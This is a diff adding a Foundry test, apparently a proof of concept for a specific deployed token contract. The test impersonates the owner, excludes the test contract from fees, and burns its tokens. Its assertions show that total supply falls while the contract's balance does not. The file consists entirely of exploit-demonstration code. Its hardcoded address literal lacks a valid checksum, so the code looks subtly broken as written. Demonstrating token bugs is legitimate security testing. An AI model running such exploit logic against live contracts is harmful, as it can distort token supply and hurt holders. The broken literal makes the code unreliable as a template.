@@ -1,0 +1,59 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.2;
+
+import "forge-std/Test.sol";
+
+interface ICoinToken {
+    function owner() external view returns (address);
+    function excludeAccount(address account) external;
+    function isExcluded(address account) external view returns (bool);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function balanceOf(address account) external view returns (uint256);
+    function totalSupply() external view returns (uint256);
+    function burn(uint256 _value) external;
+    function decimals() external view returns (uint256);
+    function _TAX_FEE() external view returns (uint256);
+    function _BURN_FEE() external view returns (uint256);
+    function _CHARITY_FEE() external view returns (uint256);
+}
+
+contract ExploitTest is Test {
+    ICoinToken constant token = ICoinToken(0x6bf3a93793e52f75543c92afec4636559988e3c1);
+
+    function testExploitBurnWithoutLoss() public {
+        // 1. Get owner and set up
+        address owner = token.owner();
+        uint256 decimals = token.decimals();
+        uint256 transferAmount = 1000 * 10**decimals;
+
+        // Impersonate owner to exclude this contract and transfer tokens
+        vm.startPrank(owner);
+        // Ensure owner has enough tokens (should be the initial holder)
+        assertGe(token.balanceOf(owner), transferAmount, "Owner has insufficient balance");
+
+        token.excludeAccount(address(this));
+        // Transfer tokens to this contract (recipient excluded => no fee)
+        token.transfer(address(this), transferAmount);
+        vm.stopPrank();
+
+        // Verify exclusion
+        assertTrue(token.isExcluded(address(this)), "Contract should be excluded");
+
+        // 2. Record state before burn
+        uint256 balanceBefore = token.balanceOf(address(this));
+        uint256 supplyBefore = token.totalSupply();
+        assertEq(balanceBefore, transferAmount, "Initial balance mismatch");
+
+        // 3. Burn all tokens (token amount)
+        token.burn(balanceBefore);
+
+        // 4. Assertions: balance unchanged, supply decreased
+        uint256 balanceAfter = token.balanceOf(address(this));
+        uint256 supplyAfter = token.totalSupply();
+
+        assertEq(balanceAfter, balanceBefore, "Balance should not change after burn for excluded account");
+        assertEq(supplyAfter, supplyBefore - balanceBefore, "Total supply should decrease by burned amount");
+    }
+}
+```
